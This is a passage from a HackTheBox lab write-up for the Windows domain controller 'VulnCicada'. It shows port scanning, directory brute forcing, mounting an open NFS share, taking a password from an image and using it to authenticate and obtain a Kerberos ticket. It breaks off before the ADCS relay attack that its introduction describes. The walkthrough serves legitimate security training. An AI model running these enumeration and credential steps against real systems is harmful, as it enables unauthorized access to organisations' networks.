@@ -1,0 +1,728 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: VulnCicada</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-vulncicada">htb-vulncicada</a> <a class="post-tag" href="/tags#vulnlab">vulnlab</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#windows">windows</a> <a class="post-tag" href="/tags#active-directory">active-directory</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#netexec">netexec</a> <a class="post-tag" href="/tags#nfs">nfs</a> <a class="post-tag" href="/tags#certenroll">certenroll</a> <a class="post-tag" href="/tags#adcs">adcs</a> <a class="post-tag" href="/tags#certipy">certipy</a> <a class="post-tag" href="/tags#esc8">esc8</a> <a class="post-tag" href="/tags#certipy-relay">certipy-relay</a> <a class="post-tag" href="/tags#netexec-coerce-plus">netexec-coerce-plus</a> <a class="post-tag" href="/tags#petitpotam">petitpotam</a> <a class="post-tag" href="/tags#secretsdump">secretsdump</a> <a class="post-tag" href="/tags#wmiexec">wmiexec</a> </span><br/><br/>
+<time class="dt-published" datetime="2025-07-03T09:00:00+00:00" itemprop="datePublished">Jul 3, 2025
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2025/07/03/htb-vulncicada.html" style="color: #e6e6e6; text-decoration: none;">HTB: VulnCicada</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/vulncicada-cover.webp" type="image/webp"/>
+<img alt="VulnCicada" class="include_image" loading="lazy" src="/img/vulncicada-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>I’ll find an open NFS share on VulnCicada, and exfil two images. One of them has a password on a sticknote, which I’ll use to get authenticated to the domain. From there, I’ll enumerate ADCS and find the DC vulnerable to ESC8. I’ll show how to do this attack from Linux, creating a malicious DNS record that points the DC back to my host, abusing a serialized empty string. Then I’ll use PetitPotam to coerce the DC to authenticate to me, where I’ll use certipy relay to get a TGT as the machine account. I’ll use that account to dump hashes for the domain, and get a shell as administrator.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/677 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/vulncicada" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">VulnCicada</a> <a href="https://hackthebox.com/machines/vulncicada" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-vulncicada.webp" type="image/webp"/> <img alt="VulnCicada" class="img-av" src="/icons/box-vulncicada.png"/></picture></a><br/><a href="https://hackthebox.com/machines/vulncicada" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1940802774217691137">03 Jul 2025</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">03 Jul 2025</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Windows <picture><source srcset="/icons/Windows.webp" type="image/webp"/><img alt="Windows" class="img-os" src="/icons/Windows.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="initial-scanning">Initial Scanning</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds 25 open TCP ports:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-vvv</span> <span class="nt">--min-rate</span> 10000 10.129.234.48
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 20:24 UTC
+...[snip]...
+Nmap scan report for 10.129.234.48
+Host is up, received echo-reply ttl 127 (0.090s latency).
+Scanned at 2025-06-16 20:24:16 UTC for 14s
+Not shown: 65510 filtered tcp ports (no-response)
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+80/tcp    open  http             syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+111/tcp   open  rpcbind          syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+2049/tcp  open  nfs              syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+3389/tcp  open  ms-wbt-server    syn-ack ttl 127
+5357/tcp  open  wsdapi           syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49668/tcp open  unknown          syn-ack ttl 127
+61842/tcp open  unknown          syn-ack ttl 127
+61843/tcp open  unknown          syn-ack ttl 127
+61867/tcp open  unknown          syn-ack ttl 127
+61929/tcp open  unknown          syn-ack ttl 127
+62457/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds
+           Raw packets sent: 131052 (5.766MB) | Rcvd: 29 (1.260KB)
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 53,80,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,5357,5985,9389 <span class="nt">-sCV</span> 10.129.234.48
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 20:26 UTC
+Nmap scan report for 10.129.234.48
+Host is up (0.090s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-16 20:38:43Z)
+111/tcp  open  rpcbind       2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|_  100005  1,2,3       2049/udp6  mountd
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl
+| Not valid before: 2024-09-13T10:42:50
+|_Not valid after:  2025-09-13T10:42:50
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl
+| Not valid before: 2024-09-13T10:42:50
+|_Not valid after:  2025-09-13T10:42:50
+2049/tcp open  mountd        1-3 (RPC #100005)
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl
+| Not valid before: 2024-09-13T10:42:50
+|_Not valid after:  2025-09-13T10:42:50
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC-JPQ225.cicada.vl
+| Not valid before: 2024-09-13T10:42:50
+|_Not valid after:  2025-09-13T10:42:50
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
+| Not valid before: 2025-04-09T08:36:14
+|_Not valid after:  2025-10-09T08:36:14
+|_ssl-date: 2025-06-16T20:40:10+00:00; +12m30s from scanner time.
+5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Service Unavailable
+|_http-server-header: Microsoft-HTTPAPI/2.0
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp open  mc-nmf        .NET Message Framing
+Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2025-06-16T20:39:31
+|_  start_date: N/A
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+|_clock-skew: mean: 12m29s, deviation: 0s, median: 12m29s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 148.25 seconds
+</span></code></pre></div></div>
+<p>The box shows many of the ports associated with a <a href="/cheatsheets/os#windows-domain-controller">Windows Domain Controller</a>. The domain is <code class="language-plaintext highlighter-rouge">cicada.vl</code>, and the hostname is <code class="language-plaintext highlighter-rouge">DC-JPQ225</code>.</p>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">netexec</code> to generate a hosts file and add it to the top of mine:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb 10.129.234.48 <span class="nt">--generate-hosts-file</span> hosts
+<span class="netexec-protocol">SMB </span><span class="go">        10.129.234.48   445    DC-JPQ225        </span><span class="netexec-logmessage">[*]</span><span class="go">  x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go">
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>hosts 
+<span class="go">10.129.234.48     DC-JPQ225.cicada.vl cicada.vl DC-JPQ225
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>hosts /etc/hosts | sponge /etc/hosts
+</code></pre></div></div>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The website is the default IIS page:</p>
+<picture>
+<source srcset="/img/image-20250616163115156.webp" type="image/webp"/>
+<img alt="image-20250616163115156" class="include_image" loading="lazy" src="/img/image-20250616163115156.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP response headers show nothing interesting:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Fri, 13 Sep 2024 15:17:21 GMT</span>
+<span class="na">Accept-Ranges</span><span class="p">:</span> <span class="s">bytes</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">"fdd9857f05db1:0"</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Microsoft-IIS/10.0</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Mon, 16 Jun 2025 20:46:25 GMT</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">703</span>
+</code></pre></div></div>
+<p>The main page loads as <code class="language-plaintext highlighter-rouge">iisstart.htm</code>, which is a typically name for that file.</p>
+<p>The 404 page is the <a href="/cheatsheets/404#iis">default IIS 404</a>:</p>
+<picture>
+<source srcset="/img/image-20250616163145036.webp" type="image/webp"/>
+<img alt="image-20250616163145036" class="include_image" loading="lazy" src="/img/image-20250616163145036.png"/>
+</picture>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, using a lowercase wordlist as IIS is not typically case sensitive:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.129.234.48 <span class="nt">-w</span> /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.129.234.48
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       29l       95w     1245c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      334l     2089w   180418c http://10.129.234.48/iisstart.png
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       32l       55w      703c http://10.129.234.48/
+</span><span class="feroxbuster-red">400</span><span class="go">      GET        6l       26w      324c http://10.129.234.48/error%1F_log
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 50s    26587/26587   0s      </span><span class="feroxbuster-green">found</span><span class="go">:3       </span><span class="feroxbuster-red">errors</span><span class="go">:0
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 49s    26584/26584   547/s   http://10.129.234.48/    
+</span></code></pre></div></div>
+<p>Nothing here.</p>
+<h3 id="smb---tcp-445">SMB - TCP 445</h3>
+<p><code class="language-plaintext highlighter-rouge">netexec</code> shows the same domain and hostname information as <code class="language-plaintext highlighter-rouge">nmap</code>, and that NTLM auth is disabled:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl <span class="nt">-u</span> guest <span class="nt">-p</span> <span class="s1">''</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.129.234.48   445    DC-JPQ225        </span><span class="netexec-logmessage">[*]</span><span class="go">  x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go">
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.129.234.48   445    DC-JPQ225        </span><span class="netexec-logfail">[-]</span><span class="go"> cicada.vl\guest: STATUS_NOT_SUPPORTED 
+</span></code></pre></div></div>
+<p>I’m not able to authenticate using Kerberos using a dummy or guest name:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl <span class="nt">-u</span> guest <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-k</span>
+<span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logmessage">[*]</span><span class="go">  x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go">
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logpurplefail">[-]</span><span class="go"> cicada.vl\guest: KDC_ERR_CLIENT_REVOKED
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl <span class="nt">-u</span> oxdf <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-k</span>
+<span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logmessage">[*]</span><span class="go">  x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go">
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logfail">[-]</span><span class="go"> cicada.vl\oxdf: KDC_ERR_C_PRINCIPAL_UNKNOWN 
+</span></code></pre></div></div>
+<h3 id="nfs---2049">NFS - 2049</h3>
+<p>There is a public NFS share on VulnCicada:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>showmount <span class="nt">-e</span> 10.129.234.48
+<span class="go">Export list for 10.129.234.48:
+/profiles (everyone)
+</span></code></pre></div></div>
+<p>I’ll mount the share to <code class="language-plaintext highlighter-rouge">/mnt</code> on my local box:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>mount <span class="nt">-t</span> nfs <span class="nt">-o</span> rw 10.129.234.48:/profiles /mnt
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span> /mnt
+<span class="go">Administrator    Debra.Wright  Jordan.Francis  Katie.Ward     Richard.Gibbons  Shirley.West
+Daniel.Marshall  Jane.Carter   Joyce.Andrews   Megan.Simpson  Rosie.Powell
+</span></code></pre></div></div>
+<p>It looks like it’s probably the <code class="language-plaintext highlighter-rouge">C:\Users</code> directory.</p>
+<p>The public user has access to all of these directories except for two (though most are empty):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>find /mnt  <span class="nt">-ls</span>
+<span class="go">1407374883623611      4 drwxrwxrwx   2 nobody   nogroup      4096 Jun  3 10:21 /mnt
+2533274790396733      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 15  2024 /mnt/Administrator
+1688849860264767      1 drwx------   2 nobody   nogroup        64 Sep 15  2024 /mnt/Administrator/Documents
+find: ‘/mnt/Administrator/Documents’: Permission denied
+1688849860264783   1456 -rwxrwxrwx   1 nobody   nogroup   1490573 Sep 13  2024 /mnt/Administrator/vacation.png
+ 844424930132659      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Daniel.Marshall
+ 844424930132661      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Debra.Wright
+1125899906843319      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Jane.Carter
+ 844424930132665      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Jordan.Francis
+ 844424930132667      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Joyce.Andrews
+ 844424930132669      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Katie.Ward
+1125899906843329      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Megan.Simpson
+ 844424930132675      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Richard.Gibbons
+ 562949953422027      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 15  2024 /mnt/Rosie.Powell
+5066549580792907      1 drwx------   2 nobody   nogroup        64 Sep 15  2024 /mnt/Rosie.Powell/Documents
+find: ‘/mnt/Rosie.Powell/Documents’: Permission denied
+2251799813708883   1792 -rwx------   1 nobody   nogroup   1832505 Sep 13  2024 /mnt/Rosie.Powell/marketing.png
+ 562949953422029      1 drwxrwxrwx   2 nobody   nogroup        64 Sep 13  2024 /mnt/Shirley.West
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>find /mnt <span class="nt">-type</span> f <span class="nt">-ls</span>
+<span class="go">find: ‘/mnt/Administrator/Documents’: Permission denied
+1688849860264783   1456 -rwxrwxrwx   1 nobody   nogroup   1490573 Sep 13  2024 /mnt/Administrator/vacation.png
+find: ‘/mnt/Rosie.Powell/Documents’: Permission denied
+2251799813708883   1792 -rwx------   1 nobody   nogroup   1832505 Sep 13  2024 /mnt/Rosie.Powell/marketing.png
+</span></code></pre></div></div>
+<p>I’ll copy the two images I can access to my host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cp</span> /mnt/Administrator/vacation.png <span class="nb">.</span>
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cp</span> /mnt/Rosie.Powell/marketing.png <span class="nb">.</span>
+<span class="go">cp: cannot open '/mnt/Rosie.Powell/marketing.png' for reading: Permission denied
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo cp</span> /mnt/Rosie.Powell/marketing.png <span class="nb">.</span>
+</code></pre></div></div>
+<p>I have to use <code class="language-plaintext highlighter-rouge">sudo</code> for the second due to the permissions. <code class="language-plaintext highlighter-rouge">vacation.png</code> is a guy with a laptop in a parachute:</p>
+<picture>
+<source srcset="/img/vulncicada-vacation.webp" type="image/webp"/>
+<img alt="" class="include_image" loading="lazy" src="/img/vulncicada-vacation.png"/>
+</picture>
+<p><code class="language-plaintext highlighter-rouge">marketing.png</code> is a woman at a desk:</p>
+<picture>
+<source srcset="/img/vulncicada-marketing.webp" type="image/webp"/>
+<img alt="" class="include_image" loading="lazy" src="/img/vulncicada-marketing.png"/>
+</picture>
+<p>That looks like a password on a stickynote.</p>
+<h2 id="auth-as-dc-jpq225">Auth as DC-JPQ225</h2>
+<h3 id="authenticated-smb">Authenticated SMB</h3>
+<h4 id="auth-poc">Auth POC</h4>
+<p>The creds work for Rosie.Powell over SMB using Kerberos:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl <span class="nt">-u</span> Rosie.Powell <span class="nt">-p</span> Cicada123 <span class="nt">-k</span>
+<span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logmessage">[*]</span><span class="go">  x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go">
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logsuccess">[+]</span><span class="go"> cicada.vl\Rosie.Powell:Cicada123 
+</span></code></pre></div></div>
+<h4 id="listing-shares">Listing Shares</h4>
+<p>The box has the standard DC shares, as well as two additional:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl <span class="nt">-u</span> Rosie.Powell <span class="nt">-p</span> Cicada123 <span class="nt">-k</span> <span class="nt">--shares</span>
+<span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logmessage">[*]</span><span class="go">  x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go">
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logsuccess">[+]</span><span class="go"> cicada.vl\Rosie.Powell:Cicada123 
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated shares
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-shareenum">Share           Permissions     Remark</span><span class="err">
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-shareenum">-----           -----------     ------
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-shareenum">ADMIN$                          Remote Admin
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-shareenum">C$                              Default share
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-shareenum">CertEnroll      READ            Active Directory Certificate Services share
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-shareenum">IPC$            READ            Remote IPC
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-shareenum">NETLOGON        READ            Logon server share 
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-shareenum">profiles$       READ,WRITE      
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-shareenum">SYSVOL          READ            Logon server share
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">CertEnroll</code> is related to ADCS (both by name and by the comment with the share). <code class="language-plaintext highlighter-rouge">profiles</code> doesn’t have a label (though based on the name it may be home directories).</p>
+<h4 id="share-enumeration">Share Enumeration</h4>
+<p>I’ll get a TGT as Rosie.Powell using <code class="language-plaintext highlighter-rouge">netexec</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl <span class="nt">-u</span> Rosie.Powell <span class="nt">-p</span> Cicada123 <span class="nt">-k</span> <span class="nt">--generate-tgt</span> Rosie
+<span class="go">.Powell
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logmessage">[*]</span><span class="go">  x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) (NTLM
+:False)   
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logsuccess">[+]</span><span class="go"> cicada.vl\Rosie.Powell:Cicada123 
